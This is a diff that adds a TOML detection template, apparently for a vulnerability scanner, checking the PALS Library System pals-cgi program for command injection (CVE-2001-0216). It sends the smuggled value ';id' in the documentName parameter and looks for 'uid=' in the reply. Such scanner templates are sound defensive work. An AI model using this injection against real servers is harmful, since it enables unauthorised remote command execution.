@@ -1,0 +1,38 @@
+[info]
+author = "ave"
+description = "验证 PALS Library System WebPALS 1.0 的 pals-cgi CGI 程序是否存在 documentName 参数命令注入漏洞。当 palsAction=restart 时，documentName 参数值被传递至 shell 执行，攻击者可通过注入分号等 shell 元字符远程执行任意命令。"
+id = "POC-AVE-2001-0088"
+name = "CVE-2001-0216 PoC - PALS Library System pals-cgi Command Injection"
+severity = "high"
+tags = ["ave-2001-0088"]
+vuln_id = [
+    "CVE-2001-0216",
+    "AVE-2001-0088",
+]
+
+[poc]
+logic = "all"
+
+[[poc.requests]]
+method = "GET"
+path = "/pals-cgi"
+protocol = "http"
+query = "palsAction=restart&documentName=;id"
+
+[poc.requests.headers]
+User-Agent = "AVE/1.0"
+
+[[poc.requests.matchers]]
+expect = true
+status = [200]
+type = "status"
+
+[[poc.requests.matchers]]
+expect = true
+part = "body"
+type = "word"
+words = [
+    "uid=",
+    "gid=",
+    "groups=",
+]
